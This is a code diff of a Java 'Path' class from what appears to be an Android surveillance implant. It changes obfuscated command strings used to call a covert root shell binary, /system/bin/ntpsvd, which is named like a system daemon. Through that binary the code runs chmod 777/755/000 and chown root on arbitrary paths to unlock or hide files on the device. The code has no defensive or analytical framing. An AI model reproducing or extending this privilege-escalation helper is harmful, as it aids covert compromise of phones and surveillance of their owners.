@@ -243,40 +243,43 @@ public class Path {
 	}
 
 	public static boolean unprotect(String path, boolean fullmode) {
-		try {
+		synchronized (Status.self().lockFramebuffer) {
+			try {
 
-			File file = new File(path);
 
-			if (fullmode) {
-				if (file.canRead() && file.canWrite()) {
-					return true;
+				File file = new File(path);
+
+				if (fullmode) {
+					if (file.canRead() && file.canWrite()) {
+						return true;
+					}
+					if (Cfg.DEBUG) {
+						Check.log(TAG + " (unprotect): " + Configuration.shellFile + M.e("  qzx chmod 777 ") + " " + path);
+					}
+					// TODO: Zeno, issue compatibility with camera on nexus??
+					Runtime.getRuntime().exec(Configuration.shellFile + M.e(" qzx chmod 777 ") + " " + path);
+					Utils.sleep(200);
+				} else {
+					if (file.canRead()) {
+						return true;
+					}
+					if (Cfg.DEBUG) {
+						Check.log(TAG + " (unprotect): " + Configuration.shellFile + M.e(" qzx chmod 755 ") + " " + path);
+					}
+					// h_3=/system/bin/ntpsvd qzx chmod 755
+					Runtime.getRuntime().exec(Configuration.shellFile + M.e(" qzx chmod 755 ") + " " + path);
+					Utils.sleep(200);
 				}
+
+				file = new File(path);
 				if (Cfg.DEBUG) {
-					Check.log(TAG + " (unprotect): " + Configuration.shellFile + M.e("  pzm 777 ") + " " + path);
+					Check.log(TAG + " (unprotect) return: " + path + " " + file.canRead());
 				}
-				// h_9=/system/bin/ntpsvd pzm 777
-				Runtime.getRuntime().exec(Configuration.shellFile + M.e(" pzm 777 ") + " " + path);
-				Utils.sleep(200);
-			} else {
-				if (file.canRead()) {
-					return true;
-				}
-				if (Cfg.DEBUG) {
-					Check.log(TAG + " (unprotect): " + Configuration.shellFile + M.e(" pzm 755 ") + " " + path);
-				}
-				// h_3=/system/bin/ntpsvd pzm 755
-				Runtime.getRuntime().exec(Configuration.shellFile + M.e(" pzm 755 ") + " " + path);
-				Utils.sleep(200);
+				return file.canRead();
+			} catch (IOException ex) {
+				Check.log(TAG + " Error (unprotect): " + ex);
+				return false;
 			}
-
-			file = new File(path);
-			if (Cfg.DEBUG) {
-				Check.log(TAG + " (unprotect) return: " + path + " " + file.canRead());
-			}
-			return file.canRead();
-		} catch (IOException ex) {
-			Check.log(TAG + " Error (unprotect): " + ex);
-			return false;
 		}
 	}
 
@@ -303,8 +306,8 @@ public class Path {
 	// chmod 000 && chown root:root
 	public static boolean lock(String path) {
 		try {
-			// h_10=/system/bin/ntpsvd pzm 000
-			Runtime.getRuntime().exec(Configuration.shellFile + M.e(" pzm 000 ") + path);
+			// h_10=/system/bin/ntpsvd qzx chmod 000
+			Runtime.getRuntime().exec(Configuration.shellFile + M.e(" qzx chmod 000 ") + path);
 
 			// h_11=/system/bin/ntpsvd fho root root
 			Runtime.getRuntime().exec(Configuration.shellFile + M.e(" fho root root ") + path);
